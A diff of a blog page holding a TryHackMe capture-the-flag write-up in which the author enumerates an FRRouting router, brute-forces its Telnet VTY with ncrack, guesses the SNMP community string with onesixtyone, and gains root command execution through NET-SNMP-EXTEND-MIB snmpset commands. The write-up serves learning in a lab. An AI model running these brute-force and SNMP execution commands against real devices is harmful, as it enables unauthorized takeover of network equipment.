@@ -6,10 +6,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>Operation Takeover | Jenn Shagrin</title>
-<meta name="description" content="TryHackMe CTF — FRRouting Telnet VTY on non-standard port, Telnet IAC byte recognition, SNMP community string discovery, write access confirmed, NET-SNMP-EXTEND-MIB RCE, root flag.">
+<meta name="description" content="TryHackMe CTF. FRRouting Telnet VTY on non-standard port, Telnet IAC byte recognition, SNMP community string discovery, write access confirmed, NET-SNMP-EXTEND-MIB RCE, root flag.">
 <meta name="author" content="">
 <link rel="canonical" href="https://jennshaggy.github.io/operation-takeover.html">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
     <link rel="stylesheet" href="/assets/css/accents.css">
 <link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
@@ -67,6 +67,9 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
 <meta property="og:url" content="https://jennshaggy.github.io/operation-takeover.html">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="Operation Takeover">
@@ -104,6 +107,7 @@
                         <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                     </svg>
                 </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
             </div>
         </div>
         <ul id="menu">
@@ -133,7 +137,7 @@
                 </a>
             </li>
             <li>
-                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                <a href="/ai-security/" title="AI Security">
                     <span>AI Security</span>
                 </a>
             </li>
@@ -142,17 +146,15 @@
 </header>
 
 <main class="main">
-<article class="post-single">
+<article class="post-single technical-writeup operation-takeover">
   <header class="post-header">
     <h1 class="post-title entry-hint-parent">Operation Takeover</h1>
-    <div class="post-description">TryHackMe CTF &mdash; Take control of the network one router at a time. I was really hoping this one would land on a router prompt. I speak Cisco IOS almost fluently. It still delivered.</div>
+    <div class="post-description">TryHackMe CTF. Take control of the network one router at a time.</div>
   </header>
 
   <div class="post-content">
 
 <p>We've gained access to the network devices VLAN. Time to hack into a router. One objective: find the flag in <code>/root/</code>.</p>
-
-<hr>
 
 <h2>Enumeration</h2>
 
@@ -162,90 +164,77 @@
 
 <img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.34.28 AM.png" alt="nmap basic scan results" style="max-width:100%;margin:2rem 0;">
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.34.49 AM.png" alt="nmap continued output" style="max-width:100%;margin:2rem 0;">
-
 <p>I spy messages in that lengthy output discourse. We'll decipher momentarily.</p>
 
 <pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.144.132.135 -oN Operation_Takeover_nmap_result.txt</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.36.45 AM.png" alt="vuln scan running" style="max-width:100%;margin:2rem 0;">
-
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.37.04 AM.png" alt="vuln scan output continued" style="max-width:100%;margin:2rem 0;">
-
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.37.20 AM.png" alt="FRRouting banner in DNSVersionBindReqTCP output" style="max-width:100%;margin:2rem 0;">
-
 <p>This immediately stood out:</p>
 
-<pre><code>DNSVersionBindReqTCP:
-|     Hello, this is FRRouting (version 10.0).
-|     Copyright 1996-2005 Kunihiro Ishiguro, et al.
-|     User Access Verification</code></pre>
+<p><code>DNSVersionBindReqTCP</code> returned &ldquo;Hello, this is FRRouting (version 10.0)&rdquo; and a <code>User Access Verification</code> prompt.</p>
 
-<p>FRRouting v10.0. A quick exploit search pulled 2-3 high-interest CVEs. Tabs left open for later.</p>
+<p>A quick exploit search of FRRouting and version 10.0 pulled up two or three CVEs of interest. I&rsquo;ll leave the tabs open.</p>
 
 <img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.46.06 AM.png" alt="CVE search results for FRRouting 10.0" style="max-width:100%;margin:2rem 0;">
 
 <p>Open Port 2623 is calling me. Visited <code>http://TARGETIP:2623</code>:</p>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.49.00 AM.png" alt="Port 2623 in browser — Telnet IAC negotiation bytes rendered as garbage" style="max-width:100%;margin:2rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.49.00 AM.png" alt="Port 2623 in browser showing Telnet IAC negotiation bytes" style="max-width:100%;margin:2rem 0;">
 
-<p>What immediately gets assessed as garbage output is actually open Telnet IAC negotiation bytes. <code>ÿ</code> equates to <code>0xFF</code> — the Telnet IAC marker. This is already fun.</p>
-
-<hr>
+<p>What someone could immediately assume to be garbage output is actually open negotiation Telnet-esque bytes. <code>ÿ</code> equates to <code>0xFF</code>, the Telnet IAC marker. Now I&rsquo;m starting to really enjoy this.</p>
 
 <h2>Telnet Enumeration</h2>
 
-<p>The system was already showing signs of a failure threshold limit. Had to test the Telnet discovery with care and caution. Set up Ncat with Telnet handling:</p>
+<p>The system is already showing signs of a failure threshold limit, so we must perform Telnet discovery with care and precision. I&rsquo;m going to set up Ncat with Telnet handling:</p>
 
 <pre><code>ncat --telnet 10.144.132.135 2623</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.57.09 AM.png" alt="ncat telnet connection — VTY password prompt" style="max-width:100%;margin:2rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 6.57.09 AM.png" alt="ncat telnet connection showing VTY password prompt" style="max-width:100%;margin:2rem 0;">
 
-<p>To be fair, this is what I expected. Password-only VTY auth confirmed — FRRouting documentation is clear that no username is needed. Critical detail for crafting a successful ncrack command.</p>
+<p>To be fair, this is what I expected.</p>
 
-<p>Quick sanity checks on the fasttrack wordlist before committing:</p>
+<p>I want to carefully craft an Ncrack command that won&rsquo;t trip an already on alert system. Ncrack handles Telnet better than Nmap, hence why it&rsquo;s my first choice. I also feel like I need to think outside the box with my wordlist choice. I&rsquo;ll go for <code>fasttrack.txt</code>.</p>
+
+<p>A quick check of FRRouting&rsquo;s Telnet documentation indicates this is password-only VTY authentication, with no username needed. I&rsquo;ll keep that in mind while crafting the Ncrack command.</p>
+
+<p>A few sanity checks on the wordlist first:</p>
 
 <img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.05.16 AM.png" alt="fasttrack.txt wordlist check" style="max-width:100%;margin:2rem 0;">
 
-<p>First ncrack attempt had a syntax error — the service name needed to be attached to the port:</p>
+<p>My first Ncrack attempt had a syntax error. It wants the service name attached to the port. My bad. Let&rsquo;s go again:</p>
 
 <pre><code>ncrack -p telnet:2623 --user test -P fasttrack.txt 10.144.132.135</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.19.27 AM.png" alt="ncrack running — feels a bit hostile" style="max-width:100%;margin:2rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.19.27 AM.png" alt="ncrack running after correcting the service and port syntax" style="max-width:100%;margin:2rem 0;">
 
 <p>Feels a bit hostile, am I right? Chill, my dude. I'm getting in there with or without you.</p>
 
-<p>Ncrack ran longer than comfortable. Tried a few manual attempts while it ran to eliminate obvious candidates:</p>
+<p>While waiting for Ncrack, I read more of the FRRouting documentation.</p>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.47.03 AM.png" alt="Manual telnet attempts — ruling out obvious passwords" style="max-width:100%;margin:2rem 0;">
+<p>Ncrack was taking longer than I was comfortable with. Before trying a simpler approach than brute force, I searched for common passwords to FRRouting Telnet VTY services and tried a few manual candidates:</p>
 
-<p>I cannot single-password brute force this for very long. Time to think outside the box.</p>
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.47.03 AM.png" alt="Manual telnet attempts ruling out obvious passwords" style="max-width:100%;margin:2rem 0;">
 
-<hr>
+<p>Well, so far we know what is not the password. I can&rsquo;t brute force this one password at a time for very long. Let&rsquo;s probe SNMP port 161 with a UDP scan.</p>
 
-<h2>SNMP &mdash; The Real Way In</h2>
-
-<p>Probed for SNMP on UDP port 161:</p>
+<h2>SNMP</h2>
 
 <pre><code>nmap -sU -p 161 --script snmp-brute 10.144.132.135</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.54.52 AM.png" alt="SNMP port 161 open — snmp-brute running" style="max-width:100%;margin:2rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 7.54.52 AM.png" alt="SNMP port 161 open with snmp-brute running" style="max-width:100%;margin:2rem 0;">
 
 <img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.00.06 AM.png" alt="Further SNMP probing" style="max-width:100%;margin:2rem 0;">
 
-<p>Port 161 open. Pressed further with onesixtyone against a community strings wordlist:</p>
+<p>Excellent. Port 161 is open, and we might be able to take a peek at the config, or at least find some useful strings. I press a little further with <code>onesixtyone</code>:</p>
 
 <pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.144.132.135</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.04.42 AM.png" alt="onesixtyone — community string pr1v4t3 confirmed" style="max-width:100%;margin:2rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 8.04.42 AM.png" alt="onesixtyone confirming the SNMP community string" style="max-width:100%;margin:2rem 0;">
 
-<p>Bam. Community string: <code>pr1v4t3</code>. SNMP is our hook. Woo!</p>
-
-<hr>
+<p>Bam. We have a hit. The community string is <code>pr1v4t3</code>. SNMP is our hook. Woo!</p>
 
 <h2>SNMP Write Access and RCE</h2>
 
-<p>Confirmed read access with snmpwalk, then tested write access by renaming the host:</p>
+<p>Let&rsquo;s try <code>snmpwalk</code>, then test write access by renaming the host:</p>
 
 <pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 1.3.6.1.2.1.1.1.0
 snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"</code></pre>
@@ -254,20 +243,20 @@ snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"</code></pre>
 
 <p>Write access confirmed? More like right access confirmed in my hands. Muahahaha. Just kidding. Onwards.</p>
 
-<p>Extended to RCE via NET-SNMP-EXTEND-MIB:</p>
+<p>Let&rsquo;s see if we can extend this into RCE with <code>NET-SNMP-EXTEND-MIB</code>:</p>
 
 <pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 10.146.187.52 \
   'nsExtendStatus."command"' = createAndGo \
   'nsExtendCommand."command"' = /bin/bash \
   'nsExtendArgs."command"' = '-c "ls /root"'</code></pre>
 
-<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.16.14 PM.png" alt="NET-SNMP-EXTEND-MIB RCE setup — ls /root" style="max-width:100%;margin:2rem 0;">
+<img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.16.14 PM.png" alt="NET-SNMP-EXTEND-MIB RCE setup running ls /root" style="max-width:100%;margin:2rem 0;">
 
 <pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.4.1.8072.1.3.2</code></pre>
 
 <img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.17.32 PM.png" alt="snmpwalk returning ls /root output" style="max-width:100%;margin:2rem 0;">
 
-<p>Pwned, indeed. Inching closer. Pulled the trigger:</p>
+<p>Pwned, indeed. Inching closer:</p>
 
 <pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 10.146.187.52 \
   'nsExtendStatus."command"' = createAndGo \
@@ -275,6 +264,8 @@ snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"</code></pre>
   'nsExtendArgs."command"' = '-c "cat /root/flag.txt"'</code></pre>
 
 <img src="/images/operation-takeover/Screenshot 2026-04-12 at 1.19.47 PM.png" alt="cat /root/flag.txt via SNMP RCE" style="max-width:100%;margin:2rem 0;">
+
+<p>Click, click, boom:</p>
 
 <pre><code>snmpwalk -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.4.1.8072.1.3.2</code></pre>
 
@@ -284,16 +275,14 @@ snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"</code></pre>
 
 <p><em>*mic drop*</em></p>
 
-<hr>
-
 <h2>Full Attack Chain</h2>
 
-<pre><code>nmap → FRRouting v10.0 on port 2623, SNMP port 161
-→ Telnet IAC bytes recognized on port 2623 → VTY password-only auth
-→ Brute force not viable → pivot to SNMP
-→ onesixtyone → community string: pr1v4t3
-→ snmpwalk confirms read access → snmpset confirms write access
-→ NET-SNMP-EXTEND-MIB → RCE → cat /root/flag.txt → flag</code></pre>
+<pre><code>nmap &gt; FRRouting v10.0 on port 2623, SNMP port 161
+&gt; Telnet IAC bytes recognized on port 2623 &gt; VTY password prompt
+&gt; Brute force taking too long &gt; pivot to SNMP
+&gt; onesixtyone &gt; community string: pr1v4t3
+&gt; snmpwalk confirms read access &gt; snmpset confirms write access
+&gt; NET-SNMP-EXTEND-MIB &gt; RCE &gt; cat /root/flag.txt &gt; flag</code></pre>
 
   </div>
   <footer class="post-footer"></footer>
@@ -366,6 +355,9 @@ snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"</code></pre>
             localStorage.setItem("pref-theme", 'dark');
         }
     })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
 </script>
 <!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
 </body>
